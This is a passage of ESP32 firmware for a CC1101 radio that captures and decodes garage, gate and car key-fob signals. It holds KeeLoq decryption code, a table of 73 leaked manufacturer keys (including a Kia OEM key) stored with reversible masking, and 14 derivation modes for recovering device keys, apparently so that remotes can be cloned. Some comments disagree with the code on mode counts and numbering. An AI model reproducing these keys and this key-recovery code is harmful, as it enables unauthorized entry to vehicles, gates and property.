  cc_writeReg(0x21,0xB6); cc_writeReg(0x22,0x11);
  cc_writeReg(0x23,0xE9); cc_writeReg(0x24,0x2A);
  cc_writeReg(0x25,0x00); cc_writeReg(0x26,0x1F);
  cc_writeReg(0x29,0x59); cc_writeReg(0x2C,0x81);
  cc_writeReg(0x2D,0x35); cc_writeReg(0x2E,0x09);
  // PATABLE: the datasheet requires, for OOK, that "the logic 0 and logic 1 power
  // levels shall be programmed to index 0 and 1 respectively" (§24, p.47). A single
  // 0x3E write only reaches index 0, and the previous value here was 0xC0 alone — which
  // left index 1 at 0x00, i.e. an OOK logic 1 transmitted at ZERO POWER. The FIFO still
  // drains (the chip clocks bits out), so a TX test looks like it passed while almost no
  // RF radiates. Measured: patable read back "c0,0,0,0,0,0,0,0", FREND0.PA_POWER=1.
  // Both levels must be written, and reaching index 1 needs a BURST write, because the
  // PATABLE index counter only advances within a burst (and resets when CSn goes high).
  // 0xC0 is the datasheet's 315/433 MHz max-power setting (Table 39); using it for both
  // levels gives an unshaped OOK envelope at full power.
  { uint8_t pat[2]={0xC0,0xC0}; cc_writeBurst(0x3E,pat,2); }
  cc_strobe(0x36); delay(2); cc_strobe(0x34); delay(5);
  uint8_t pn  = cc_readStatus(0x30); // PARTNUM — CC1101 always returns 0x00
  uint8_t ver = cc_readStatus(0x31); // VERSION — CC1101A returns 0x14
  Serial.printf("[CC1101] PARTNUM=0x%02X VERSION=0x%02X\n", pn, ver);
  // PARTNUM 0x00 is a real CC1101. VERSION is 0x14 on CC1101 and 0x04 on
  // the earlier silicon. Any other byte, including 0x00 and 0xFF, is a dead bus.
  cc1101Version=ver;
  cc1101OK=(ver==0x04||ver==0x14);
  SPI.endTransaction();
  return cc1101OK;
}

// Switch CC1101 to 2-FSK async mode for KIA/HYU V0 capture.
// Only MDMCFG2 (modulation) and DEVIATN (deviation) are changed;
// PKTCTRL0=0x30 (async serial) and IOCFG0=0x0D (GDO0=bitstream) stay.
static void cc_setCaptureFSK(){
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_strobe(0x36); delayMicroseconds(120);      // SIDLE
  cc_writeReg(0x12,0x00);  // MDMCFG2: 2-FSK, no sync, no preamble qual
  cc_writeReg(0x15,0x47);  // DEVIATN: ±47.6 kHz
  cc_strobe(0x34); delay(5);                    // SRX
  SPI.endTransaction();
}
// Restore CC1101 to OOK async mode (default).
static void cc_setCaptureOOK(){
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_strobe(0x36); delayMicroseconds(120);
  cc_writeReg(0x12,0x30);  // MDMCFG2: OOK, no sync
  cc_writeReg(0x15,0x00);  // DEVIATN: n/a for OOK
  cc_strobe(0x34); delay(5);
  SPI.endTransaction();
}


// ─── Rolling-Code Decode Helpers ─────────────────────────────────────────────

// Hex nibbles from bit string
// Encode up to `len` bit characters as hex into `out`.
//
// `cap` is the size of `out` including the NUL. It is REQUIRED, because the original
// form had no bound: the only caller passed a stack `char hexbuf[128]` while allowing
// `len` up to CAP_SZ (512). 512 bits needs (512+3)/4 = 128 hex chars, plus the NUL that
// this function always writes = 129 bytes into a 128-byte stack buffer. That is a
// one-byte stack overflow, and it tripped the canary in the field:
//
//   Stack smashing protect failure!
//   __stack_chk_fail -> decodeSignal() -> scanTick() -> loop()
//
// The overflow only manifests when bLen >= 509, i.e. when a capture fills the bit
// buffer — which is why it appeared at 315 MHz while sweeping: a strong fob burst
// long enough to reach that length. Nothing corrupts until the canary is checked on
// return, so the crash surfaced far from the write.
static void ks_hexStr(const char* bits,int len,char* out,size_t cap){
  if(cap==0) return;
  int o=0,chunks=(len+3)/4;
  for(int c=0;c<chunks;c++){
    if((size_t)(o+1)>=cap) break;              // leave room for the NUL
    int v=0; for(int b=0;b<4&&c*4+b<len;b++) v=(v<<1)|(bits[c*4+b]=='1'?1:0);
    out[o++]="0123456789ABCDEF"[v];
  }
  out[o]=0;
}

// Compute stddev (µs) of pulse widths near the TE centroid (mean).
// Only counts pulses in [mean/2, mean*3/2] so inter-frame gaps don't inflate it.
// Returns 0 if fewer than 2 samples qualify.
static uint32_t ks_teStddev(const uint32_t* buf,int cnt,uint32_t mean){
  if(mean<10||cnt<4) return 0;
  uint32_t lo=mean/2, hi=mean+(mean/2);
  uint64_t sumSq=0; int n=0;
  for(int i=0;i<cnt;i++){
    if(buf[i]<lo||buf[i]>hi) continue;
    int32_t d=(int32_t)buf[i]-(int32_t)mean;
    sumSq+=(uint64_t)((int64_t)d*d); n++;
  }
  if(n<2) return 0;
  return (uint32_t)sqrt((double)(sumSq/(uint64_t)n));
}

// k-means 2-cluster on sorted pulse widths → returns true, sets cA(short) cB(long)
static bool ks_km2(const uint32_t* buf,int n,uint32_t& cA,uint32_t& cB){
  if(n<6) return false;
  uint32_t mn=buf[0],mx=buf[0];
  for(int i=1;i<n;i++){if(buf[i]<mn)mn=buf[i];if(buf[i]>mx)mx=buf[i];}
  if(mx==mn) return false;
  cA=mn+(mx-mn)/3; cB=mn+2*(mx-mn)/3;
  for(int it=0;it<8;it++){
    uint64_t sA=0,sB=0; uint32_t nA=0,nB=0;
    for(int i=0;i<n;i++){
      if(abs((long)buf[i]-(long)cA)<abs((long)buf[i]-(long)cB)){sA+=buf[i];nA++;}
      else{sB+=buf[i];nB++;}
    }
    if(nA) cA=sA/nA; if(nB) cB=sB/nB;
  }
  return (cA>0&&cB>cA*1.4f);
}

// Threshold-based bit extraction
static uint16_t ks_mkBits(const uint32_t* buf,int n,char* out,uint32_t thr){
  uint16_t b=0; bool hi=true;
  for(int i=0;i<n;i++){
    int reps=(buf[i]>thr)?2:1; char c=hi?'1':'0';
    for(int r=0;r<reps&&b<CAP_SZ;r++) out[b++]=c;
    hi=!hi;
  }
  out[b]=0; return b;
}

// Manchester decode
static uint16_t ks_manchester(const char* in,int n,char* out){
  uint16_t b=0;
  for(int i=0;i+1<n;i+=2){
    if(in[i]=='1'&&in[i+1]=='0') out[b++]='1';
    else if(in[i]=='0'&&in[i+1]=='1') out[b++]='0';
    else { if(b>4) break; b=0; }
  }
  out[b]=0; return b;
}

// KeeLoq NLF
static inline uint32_t ks_nlf(uint32_t x){return (KL_NLF>>(x&31))&1;}
static inline uint32_t ks_bit(uint32_t x,uint8_t n){return (x>>n)&1;}

// KeeLoq decrypt one bit
static inline uint32_t ks_klDec1(uint32_t& hi,uint32_t& lo,uint64_t key){
  uint32_t b= ks_bit(hi,31)^ks_bit(lo,0)
             ^ks_nlf(ks_bit(hi,31)|ks_bit(hi,26)<<1|ks_bit(hi,20)<<2|ks_bit(hi,9)<<3|ks_bit(hi,1)<<4)
             ^ks_bit((uint32_t)(key>>(16&63)),0);
  hi=(hi>>1)|((lo&1)<<31); lo=(lo>>1)|(b<<31);
  key=(key>>1)|(key<<63);
  return b;
}

// ─── KeeLoq Manufacturer Keys ────────────────────────────────────────────────
// Real, publicly leaked manufacturer keys. Every entry carries the learning
// type from the corpus it came from, so the derivation the firmware tries is the
// derivation that key actually uses. Entries with type 0 (unrecorded) and the
// factory-default all-zero / all-ones keys are flagged suspect=1: the decoder
// still tries them, but a match is reported as unconfirmed rather than as an
// identification.
//
// This replaces the earlier table of invented fillers (OEM-A…Generic-F,
// Clone-1111…Clone-EEEE, OEM-lo32only), which were not real keys. They could
// only ever produce a false positive, and every recovery run spent budget on
// them first.
//
// Provenance is recorded in `research/01` §1; the corpus
// itself is the MFR_KEYS table below. The upstream corpus file is not shipped with this
//
//   · 72 gate/barrier/shutter/alarm entries, from a publicly leaked key list.
//     Note: these are gate remotes, not OEM car fobs. The two "automotive-adjacent"
//     entries are aftermarket alarm fobs.
//   · Kia_V3_V4_OEM — the one public OEM automotive KeeLoq key.
//
// Learning types: see enum KLLearn. Format: {name, key, learn, suspect}.
static const MfrKey MFR_KEYS[]={
  // ── OEM automotive — the only public KeeLoq car key known ───────────────
  {"Kia_V3_V4_OEM", 0xCC88E6C23CEC0269ULL, KL_SIMPLE, 0},
  // ── Publicly leaked gate / barrier / shutter / alarm corpus ────────────────
  // Ordered as they appear in the source file. Full provenance above.
  {"DoorHan", 0xC9F1C7E5F53307FDULL,  1, 0},
  {"Beninca_ARC", 0xA2BE75CFB0AD3AA1ULL,  9, 0},
  {"Kingates_Stylo4k", 0xFFDC715050717F5EULL, 10, 0},
  {"Jarolift", 0x50241558F671D394ULL, 11, 0},
  {"FAAC_SLH", 0x5AF9BA5B46F5FD1AULL,  5, 0},
  {"BFT", 0xDED83DDBFE99BEFAULL,  3, 0},
  {"Stilmatic", 0x1FDB86420ECA9753ULL,  2, 0},
  {"Mongoose", 0xCB81238F43602DC3ULL,  2, 0},
  {"NICE_Smilo", 0x3EDD1FDF1E5EBDFDULL,  1, 0},
  {"NICE_MHOUSE", 0xDAFAD91DFD3D1E7EULL,  1, 0},
  {"Dea_Mio", 0xAC22022474571662ULL,  1, 0},
  {"Genius_Bravo", 0xF7DB77772822E822ULL,  2, 0},
  {"FAAC_RC_XT", 0xF7DB77774822E822ULL,  2, 0},
  {"Came_Space", 0x06F1AE44F2E405BBULL,  1, 0},
  {"DTM_Neo", 0xCB32EDD1971368FEULL,  1, 0},
  {"GSN", 0xE7D1219BDD258259ULL,  2, 0},
  {"Beninca", 0xA2BE61CFB0AD2EA1ULL,  4, 0},
  {"Elmes_Poland", 0x48D03F806B3CE4FBULL,  2, 0},
  {"IronLogic", 0x3717F573717F7757ULL,  1, 0},
  {"IL-100_Smart", 0x737577F717375F71ULL,  1, 0},
  {"Comunello", 0x0BDD2E7BF8BDC943ULL,  2, 0},
  {"Sommer", 0x0AADF19AACE0980EULL,  2, 0},
  {"Normstahl", 0x675D0E91520384C3ULL,  2, 0},
  {"KEY", 0x581178D85FF95171ULL,  1, 0},
  {"JCM_Tech", 0xFABC5D1857018655ULL,  1, 0},
  {"Novoferm", 0xF07BD17EB05B515EULL,  1, 0},
  {"EcoStar", 0x9F387B505EB167B7ULL,  2, 0},
  {"Gibidi", 0xA4545724545733B3ULL,  1, 0},
  {"Aprimatic", 0x391BDBD91F9A5F99ULL,  1, 0},
  {"Jolly_Motors", 0xA4ACC22858AEE00AULL,  1, 0},
  {"Centurion", 0x17DFE2414C95F466ULL,  2, 0},
  {"Monarch", 0x257167151FC71F25ULL,  2, 0},
  {"Rosh", 0xAC220224745717C2ULL,  1, 0},
  {"Pecinin", 0x0202E3C9EC8B71D2ULL,  1, 0},
  {"Rossi", 0x35282C31E96C282CULL,  1, 0},
  {"Merlin", 0xB421E99AC34410BFULL,  2, 0},
  {"Motorline", 0x9A7325F9AE289D93ULL,  2, 0},
  {"Steelmate", 0xDB3C26EED950410BULL,  2, 0},
  {"Cardin_S449", 0xC00BC4D07A9FF378ULL,  2, 0},
  {"Alligator", 0x0DE13B3AFDD86AA9ULL,  1, 0},
  {"SL_A6-A9_Tomahawk_9010", 0xF7FD967175371DD7ULL,  1, 0},
  {"Pantera", 0x5F9EBBF85ABBDEDFULL,  1, 0},
  {"SL_A2-A4", 0x88640868B86C2409ULL,  1, 0},
  {"Cenmax_St-5", 0x0802698E8AC8E228ULL,  1, 0},
  {"SL_B6_B9_dop", 0xCDE112202CE8A9ABULL,  1, 0},
  {"Harpoon", 0x97579BF7967BF3C7ULL,  1, 0},
  {"Tomahawk_TZ-9030", 0x779BF7974793DBF6ULL,  1, 0},
  {"Tomahawk_Z_X_3-5", 0xBED012220ECA9A9CULL,  1, 0},
  {"Cenmax_St-7", 0xFFA04762F9D21BA1ULL,  1, 0},
  {"Sheriff", 0x13C5E25465F87531ULL,  1, 0},
  {"Pantera_CLK", 0x67D6273B5635FF51ULL,  1, 0},
  {"Cenmax", 0xFDB8657531FDB531ULL,  1, 0},
  {"Alligator_S-275", 0xBCE19B9B27E85DF1ULL,  1, 0},
  {"Guard_RF-311A", 0x4C2F2A14467F945BULL,  2, 0},
  {"Partisan_RX", 0xF52359726954A2D0ULL,  1, 0},
  {"APS-1100_APS-2550", 0x12FD7DB11F927A79ULL,  1, 0},
  {"Pantera_XS_Jaguar", 0x12FD7DB11FB39B99ULL,  1, 0},
  {"KGB_Subaru", 0x777773117F9C7777ULL,  6, 0},
  {"Magic_1", 0x777773117F9C7777ULL,  7, 0},
  {"Magic_2", 0x777771137D9E7777ULL,  7, 0},
  {"Magic_3", 0xC0139C57777762F1ULL,  8, 0},
  {"Magic_4", 0xFBDC23D777776477ULL,  8, 0},
  {"Teco", 0xD3AA6953AD4D81D5ULL,  0, 1},
  {"Mutanco_Mutancode", 0x6383134641C34230ULL,  0, 1},
  {"Leopard", 0x8CF10B8C663FB57BULL,  0, 1},
  {"Faraon", 0x3BF061B32789C631ULL,  0, 1},
  {"Reff", 0x283DD8CF3F463A55ULL,  0, 1},
  {"ZX-730-750-1055", 0x38221391D5C5A1D4ULL,  0, 1},
  {"FFFF_Simple", 0x8888888888888888ULL,  1, 1},
  {"FFFF_Normal", 0x8888888888888888ULL,  2, 1},
  {"Zero_Simple", 0x7777777777777777ULL,  1, 1},
  {"Zero_Normal", 0x7777777777777777ULL,  2, 1},
};

// ── Key-table sizing ───────────────────────────────────────────────────────────
// Table size is derived, not asserted. 73 real keys × 14 derivation modes =
// 1022 candidate device keys generated per recovery pass.
#define N_MFR_KEYS ((int)(sizeof(MFR_KEYS)/sizeof(MFR_KEYS[0])))

// The stored keys are MASKED, not plaintext. The table must contain them (the decoder derives
// and decrypts with them), but leaving them readable meant the file was the list. Each stored
// value is the affine transform of the real key; ks_unmaskMfrKey below is the inverse, applied
// once per key on the way into a derivation. It is obfuscation, not a security boundary: the
// constants are right here, the table is in a public repository, and anything the device can
// compute, so can a reader. Reversible with tools/mask_mfrkeys.py. Produced by
// tools/publish_prepare.py; do not edit this branch by hand.
#define MFR_KEY_A  0x5A5A5A5A5A5A5A5AULL   // matches tools/mask_mfrkeys.py
#define MFR_KEY_B  0x3C3C3C3C3C3C3C3CULL
#define MFR_KEY_N  13

static inline uint64_t ks_unmaskMfrKey(uint64_t v){
  // inverse of ROTL(k ^ A, N) ^ B  ->  ROTR(v ^ B, N) ^ A
  uint64_t x = (v ^ MFR_KEY_B);
  const uint8_t n = MFR_KEY_N;
  return ((x >> n) | (x << (64 - n))) ^ MFR_KEY_A;
}
static_assert(N_MFR_KEYS == 73, "MFR_KEYS count changed -- update this assert with the table");

static_assert(N_MFR_KEYS == 73, "MFR_KEYS count changed — update research/sources/keeloq_mfcodes_public.txt and this assert together");
#define N_KL_DERIV_MODES 14
#define MAX_DERIVED_KEYS (N_MFR_KEYS * N_KL_DERIV_MODES)
// V3: pin the mode count so the per-mode tables cannot silently disagree with
// N_KL_DERIV_MODES. A short initialiser list zero-fills the tail, which would
// make a mode silently report KL_UNKNOWN and quietly drop out of the derived
// key budget that the false-positive arithmetic depends on.
static_assert(N_KL_DERIV_MODES == 14, "derivation mode count changed — update KL_MODE_LEARN, KL_MODE_NAME and ks_deriveOneMfrKey together");
static_assert(MAX_DERIVED_KEYS == 73 * 14, "MAX_DERIVED_KEYS must stay 73 x 14 = 1022");

// The 14 derivations, in the fixed order ks_deriveOneMfrKey() emits them. The
// first entry (simple learning, device key == mfr key) is not a derivation and
// is handled separately by both the decoder and the analyzer.
//   M0  normal-learning   M1  xor-seed        M2  secure (AN662)
//   M3  full-sn           M4  normal-inv      M5  byteswap-sn
//   M6  half-mirror       M7  normal-dec      M8  magic-xor-1
//   M9  magic-serial-1    M10 magic-serial-2  M11 magic-serial-3
//   M12 rev-simple        M13 rev-normal
// Their learning types are KL_MODE_LEARN (published scheme vs KL_HEURISTIC);
// their display names are KL_MODE_NAME.

// ─── User-loadable Manufacturer Keys ─────────────────────────────────────────
// Persistent NVS-backed slots. The user pastes a 64-bit key (16-hex) for a
// specific brand/model (e.g. their car-fob OEM) and the firmware then tries
// it FIRST in ks_klPredict() — both as a simple-learning key and via Microchip
// normal-learning (TB003) diversification. Sourcing of real keys is the user's
// responsibility (the firmware ships with none).
#define MAX_USER_KEYS 16
struct UserKey {
  char     name[24];   // display label
  uint64_t key;        // 64-bit manufacturer key
  uint8_t  family;     // 0=KeeLoq HCS3xx, 1=FAAC SLH, 2=AN-Motors/DoorHan, 3=DEA, 4=Generic
  uint8_t  pad[3];     // alignment
  uint32_t magic;      // 0xA5B5C5D5 = valid slot
};
static UserKey USR_KEYS[MAX_USER_KEYS] = {};
#define USR_KEY_MAGIC 0xA5B5C5D5UL

static Preferences keyPrefs;
static Preferences swpPrefs;

// Persist sweep + capture range to NVS so they survive any reboot (watchdog, brownout, power cycle).
// capRangeMin/Max: set by FOBclone/FOBcatch auto-arm; must outlive reboots so the fallback sweep
// stays constrained to the fob's band instead of scanning all 39 frequencies after every reset.
static void swp_save(){
  swpPrefs.begin("swprange",false);
  swpPrefs.putFloat("sMin",sweepMin);
  swpPrefs.putFloat("sMax",sweepMax);
  swpPrefs.putFloat("cRMin",capRangeMin);
  swpPrefs.putFloat("cRMax",capRangeMax);
  swpPrefs.end();
}
static void swp_load(){
  swpPrefs.begin("swprange",true);
  float m=swpPrefs.getFloat("sMin",0.0f);
  float x=swpPrefs.getFloat("sMax",9999.0f);
  float cm=swpPrefs.getFloat("cRMin",0.0f);
  float cx=swpPrefs.getFloat("cRMax",9999.0f);
  swpPrefs.end();
  // Sanity-check: only apply if values are in the CC1101 tuning range.
  if(m>=100.0f&&m<=950.0f) sweepMin=m;
  if(x>=100.0f&&x<=950.0f) sweepMax=x;
  if(cm>=100.0f&&cm<=950.0f) capRangeMin=cm;
  if(cx>=100.0f&&cx<=950.0f) capRangeMax=cx;
}

static void ks_loadUserKeys(){
  keyPrefs.begin("ukeys", true);
  size_t expect = sizeof(USR_KEYS);
  size_t have   = keyPrefs.getBytesLength("blob");
  if(have == expect){
    keyPrefs.getBytes("blob", USR_KEYS, expect);
  }
  keyPrefs.end();
  // Sanity-zero any slot whose magic doesn't match (handles struct layout changes)
  for(int i=0;i<MAX_USER_KEYS;i++){
    if(USR_KEYS[i].magic != USR_KEY_MAGIC){
      memset(&USR_KEYS[i], 0, sizeof(UserKey));
    }
  }
}
static void ks_saveUserKeys(){
  keyPrefs.begin("ukeys", false);
  keyPrefs.putBytes("blob", USR_KEYS, sizeof(USR_KEYS));
  keyPrefs.end();
}
static int ks_addUserKey(const char* name, uint64_t key, uint8_t family){
  for(int i=0;i<MAX_USER_KEYS;i++){
    if(USR_KEYS[i].magic != USR_KEY_MAGIC){
      memset(&USR_KEYS[i], 0, sizeof(UserKey));
      strncpy(USR_KEYS[i].name, name, sizeof(USR_KEYS[i].name)-1);
      USR_KEYS[i].key    = key;
      USR_KEYS[i].family = family;
      USR_KEYS[i].magic  = USR_KEY_MAGIC;
      ks_saveUserKeys();
      return i;
    }
  }
  return -1;
}
static bool ks_delUserKey(int idx){
  if(idx < 0 || idx >= MAX_USER_KEYS) return false;
  memset(&USR_KEYS[idx], 0, sizeof(UserKey));
  ks_saveUserKeys();
  return true;
}
static void ks_clearUserKeys(){
  memset(USR_KEYS, 0, sizeof(USR_KEYS));
  ks_saveUserKeys();
}
static String ks_userKeysJson(){
  String s = "["; bool first = true;
  for(int i=0;i<MAX_USER_KEYS;i++){
    if(USR_KEYS[i].magic != USR_KEY_MAGIC) continue;
    if(!first) s += ","; first = false;
    char kh[20];
    snprintf(kh, 20, "%08lX%08lX",
      (unsigned long)(USR_KEYS[i].key >> 32),
      (unsigned long)(USR_KEYS[i].key & 0xFFFFFFFF));
    // mask all but last 4 hex of the key for safety in logs
    String masked = String(kh).substring(0,4) + "…" + String(kh).substring(12);
    s += "{\"i\":" + String(i) +
         ",\"name\":\"" + String(USR_KEYS[i].name) + "\"" +
         ",\"key_preview\":\"" + masked + "\"" +
         ",\"family\":" + String(USR_KEYS[i].family) + "}";
  }
  s += "]"; return s;
}
// Parse a hex string (with optional 0x prefix, spaces) into a 64-bit key
static bool ks_parseHex64(const char* in, uint64_t& out){
  uint64_t v = 0; int hexCount = 0;
  for(const char* p = in; *p; p++){
    char c = *p;
    if(c=='0' && (*(p+1)=='x' || *(p+1)=='X')){ p++; continue; }
    if(c==' '||c=='_'||c=='-'||c==':') continue;
    uint8_t d;
    if(c>='0'&&c<='9') d = c-'0';
    else if(c>='a'&&c<='f') d = c-'a'+10;
    else if(c>='A'&&c<='F') d = c-'A'+10;
    else return false;
    v = (v << 4) | d; hexCount++;
    if(hexCount > 16) return false;
  }
  if(hexCount == 0) return false;
  out = v; return true;
}

// ─── KeeLoq Key Diversification ───────────────────────────────────────────────
// Produces up to 9 derived device keys per manufacturer seed, covering all
// published Microchip TB003 / AN742 / AN662 derivations plus modes that
// cover aftermarket receivers, clone chips, and common clone-chip variants:
//
//   Mode 1 — Normal Learning /ENC, Microchip TB003 / AN742 (HCS300/301/320/410):
//             devLo = KL_enc(snLo, mfrKey)
//             devHi = KL_enc(snHi | 0x20000000, mfrKey)
//             devKey = devHi || devLo
//
//   Mode 2 — XOR-seed variant (AN-Motors/DoorHan clones, some CAME AT):
//             seed = snLo ^ snHi
//             devKey = KL_enc(seed|0x60000000) || KL_enc(seed)
//
//   Mode 3 — Secure Learning, Microchip AN662 (flag nibble 0x40):
//             devKey = KL_enc(snHi|0x40000000) || KL_enc(snLo)
//
//   Mode 4 — Full-SN encrypt (some minimal OEM implementations):
//             f32 = KL_enc(sn & 0x0FFFFFFF, mfrKey)
//             devKey = f32 || f32
//
//   Mode 5 — Inverted normal-learn (aftermarket receivers that XOR-invert the derived key):
//             devKey = ~(normal-learn result)
//
//   Mode 6 — Byte-swapped SN (Genie/Overhead Door style):
//             bsLo = byte_reverse(snLo), bsHi = byte_reverse(snHi)
//             devKey = KL_enc(bsHi|0x20000000) || KL_enc(bsLo)
//
//   Mode 7 — Half-key mirror (cheap OEM chips truncate MFR key to 32-bit):
//             k32 = (uint32_t)mfrKey
//             devKey = k32 || k32   (same 32-bit block in both halves)
//
//   Mode 8 — Standard Decrypt form, Microchip TB003 / AN742:
//             sn28 = sn & 0x0FFFFFFF
//             devLo = KL_dec(sn28 | 0x20000000, mfrKey)
//             devHi = KL_dec(sn28 | 0x60000000, mfrKey)
//             devKey = devHi || devLo
//
//   Mode 9 — Magic XOR Type-1 (Beninca and compatible clone chips):
//             sn28 = sn & 0x0FFFFFFF
//             devKey = (sn28 << 32 | sn28) XOR mfrKey
//
//   Mode 10 — Magic Serial Type 1 (CAME AT / DoorHan clones):
//             b0=sn28&0xFF, b1=(sn28>>8)&0xFF
//             devKey = (mfrKey&0xFFFFFFFF) | (sn28<<40) | ((b0+b1)<<32)
//
//   Mode 11 — Magic Serial Type 2 (top 4 bytes overwritten):
//             devKey = (mfrKey&0xFFFFFFFF) | (sn byte3..0 as big-endian in bytes 7..4)
//
//   Mode 12 — Magic Serial Type 3 (lower 24 bits = sn24):
//             devKey = (mfrKey & 0xFFFFFFFFFF000000) | (sn28 & 0xFFFFFF)
//
//   Mode 13 — Byte-reversed key, simple (unknown-key fallback):
//             revKey = byte_reverse_64(mfrKey); devKey = revKey
//
//   Mode 14 — Byte-reversed key, standard decrypt form (unknown-key heuristic):
//             revKey = byte_reverse_64(mfrKey)
//             devKey = KL_dec(sn28|0x60000000, revKey) || KL_dec(sn28|0x20000000, revKey)
//
// Returns number of derived keys written into out[].
//
// Each emitted entry carries the learning type of the *mode* that produced it
// (not of the parent key) plus the parent key's suspect flag, so a match can be
// reported with the derivation that actually explains it.
//
// Mode → learning type map (see KLLearn). Modes 2,3,4,5,6 (xor-seed, full-sn,
// normal-inv, byteswap-sn, half-mirror) and 12,13 (byte-reversed key) are
// heuristic: they are not published schemes, so they are labelled KL_HEURISTIC
// and never reported as an identification.
static const uint8_t KL_MODE_LEARN[N_KL_DERIV_MODES] = {
  KL_NORMAL,  KL_HEURISTIC, KL_SECURE,    KL_HEURISTIC, KL_HEURISTIC,
  KL_HEURISTIC, KL_HEURISTIC, KL_NORMAL,  KL_MAGIC_XOR1, KL_MAGIC_SER1,
  KL_MAGIC_SER2, KL_MAGIC_SER3, KL_HEURISTIC, KL_HEURISTIC
};

// Mode names, indexed the same as KL_MODE_LEARN. Used by /api/mfr_test and logs.
static const char* KL_MODE_NAME[N_KL_DERIV_MODES] = {
  "normal-learning", "xor-seed", "secure", "full-sn", "normal-inv",
  "byteswap-sn", "half-mirror", "normal-dec", "magic-xor-1", "magic-serial-1",
  "magic-serial-2", "magic-serial-3", "rev-simple", "rev-normal"
};

// Derive all N_KL_DERIV_MODES candidate device keys for one manufacturer key and
// one serial. This is the single source of truth for the derivations: the table
// generator (ks_deriveMfrKeys) and the HTTP key tester (/api/mfr_test) both call
// it, so a mode added or corrected here appears in both places at once.
//   out[m] = derived device key for mode m, to be tried with ks_klDecrypt.
// Returns the number of modes written (always N_KL_DERIV_MODES).
static uint8_t ks_deriveOneMfrKey(uint32_t sn, uint64_t mk, uint64_t out[N_KL_DERIV_MODES]){
  uint16_t snLo=(uint16_t)(sn&0xFFFF);
  uint16_t snHi=(uint16_t)(sn>>16);
  uint16_t snXor=snLo^snHi;
  uint32_t sn28=sn&0x0FFFFFFFUL;
  uint16_t bsLo=((snLo>>8)|(snLo<<8))&0xFFFF;
  uint16_t bsHi=((snHi>>8)|(snHi<<8))&0xFFFF;
  // Byte-reversed key, shared by modes 12 and 13.
  uint64_t rev=0;
  for(uint8_t rb=0;rb<8;rb++) rev|=((mk>>(rb*8))&0xFFULL)<<((7-rb)*8);

  // Mode 0: Normal Learning /ENC (TB003 / AN742 scheme, encrypt-based form)
  out[0]  = ((uint64_t)ks_klEncrypt((uint32_t)snHi|0x20000000UL,mk)<<32)
          |  (uint64_t)ks_klEncrypt((uint32_t)snLo,mk);
  // Mode 1: XOR-seed variant
  out[1]  = ((uint64_t)ks_klEncrypt((uint32_t)snXor|0x60000000UL,mk)<<32)
          |  (uint64_t)ks_klEncrypt((uint32_t)snXor,mk);
  // Mode 2: Secure Learning (AN662, flag 0x40) — needs the seed to be real
  out[2]  = ((uint64_t)ks_klEncrypt((uint32_t)snHi|0x40000000UL,mk)<<32)
          |  (uint64_t)ks_klEncrypt((uint32_t)snLo,mk);
  // Mode 3: Full-SN encrypt
  { uint32_t f32=ks_klEncrypt(sn28,mk); out[3]=((uint64_t)f32<<32)|(uint64_t)f32; }
  // Mode 4: Inverted normal-learn (aftermarket XOR-invert of derived key)
  out[4]  = ~out[0];
  // Mode 5: Byte-swapped SN (Genie/Overhead Door style)
  out[5]  = ((uint64_t)ks_klEncrypt((uint32_t)bsHi|0x20000000UL,mk)<<32)
          |  (uint64_t)ks_klEncrypt((uint32_t)bsLo,mk);
  // Mode 6: Half-key mirror (32-bit truncated MFR key)
  { uint64_t k32=(uint64_t)(uint32_t)mk; out[6]=(k32<<32)|k32; }
  // Mode 7: Standard decrypt form (Microchip TB003 / AN742)
  out[7]  = ((uint64_t)ks_klDecrypt(sn28|0x60000000UL,mk)<<32)
          |  (uint64_t)ks_klDecrypt(sn28|0x20000000UL,mk);
  // Mode 8: Magic XOR Type-1 (Beninca and compatible clone chips)
  out[8]  = (((uint64_t)sn28<<32)|(uint64_t)sn28)^mk;
  // Mode 9: Magic Serial Type 1 (CAME AT / DoorHan clones)
  //   man = (mfrKey&0xFFFFFFFF) | (sn28<<40) | ((b0+b1)<<32)
  { uint8_t b0=(uint8_t)(sn28&0xFF), b1=(uint8_t)((sn28>>8)&0xFF);
    out[9]=(mk&0xFFFFFFFFULL)|((uint64_t)sn28<<40)|((uint64_t)((b0+b1)&0xFF)<<32); }
  // Mode 10: Magic Serial Type 2 (top 4 bytes = fix bytes big-endian)
  out[10] = (mk&0xFFFFFFFFULL)
          | ((uint64_t)(sn&0xFF)<<56)   | ((uint64_t)((sn>>8)&0xFF)<<48)
          | ((uint64_t)((sn>>16)&0xFF)<<40) | ((uint64_t)((sn>>24)&0xFF)<<32);
  // Mode 11: Magic Serial Type 3 (lower 24 bits = sn24)
  out[11] = (mk&0xFFFFFFFFFF000000ULL)|(sn28&0xFFFFFFUL);
  // Mode 12: Byte-reversed MFR key, simple
  out[12] = rev;
  // Mode 13: Byte-reversed MFR key, standard decrypt form
  out[13] = ((uint64_t)ks_klDecrypt(sn28|0x60000000UL,rev)<<32)
          |  (uint64_t)ks_klDecrypt(sn28|0x20000000UL,rev);
  return N_KL_DERIV_MODES;
}

static uint16_t ks_deriveMfrKeys(uint32_t sn,MfrKey* out){
  uint16_t nd=0;
  // Emit one derived key: name + suspect from the parent key, learning type from
  // the mode that produced it. The guard makes the MAX_DERIVED_KEYS bound
  // load-bearing rather than assumed.
  #define EMIT_KL(_key,_mode)                                                   \
    do {                                                                        \
      if(nd >= MAX_DERIVED_KEYS) break;                                         \
      out[nd].name    = MFR_KEYS[k].name;                                       \
      out[nd].key     = (_key);                                                 \
      out[nd].learn   = KL_MODE_LEARN[(_mode)];                                 \
      out[nd].suspect = (MFR_KEYS[k].suspect || KL_MODE_LEARN[(_mode)] == KL_HEURISTIC) ? 1 : 0; \
      nd++;                                                                     \
    } while(0)
  for(uint8_t k=0;k<(uint8_t)N_MFR_KEYS;k++){
    uint64_t dk[N_KL_DERIV_MODES];
    ks_deriveOneMfrKey(sn, ks_unmaskMfrKey(MFR_KEYS[k].key), dk);
    for(uint8_t m=0;m<N_KL_DERIV_MODES;m++) EMIT_KL(dk[m], m);
  }
  #undef EMIT_KL
  return nd;
}

// ─── Recent KeeLoq Frame Ring Buffer ─────────────────────────────
// Unconditionally records the last KL_RECENT_MAX KeeLoq frames decoded from
// any fob. key_probe tests a candidate key against these frames without
// starting a recovery session.
#define KL_RECENT_MAX 5
static KLFrame  KL_RECENT_BUF[KL_RECENT_MAX];
static uint8_t  KL_RECENT_HEAD = 0; // next write index (ring)
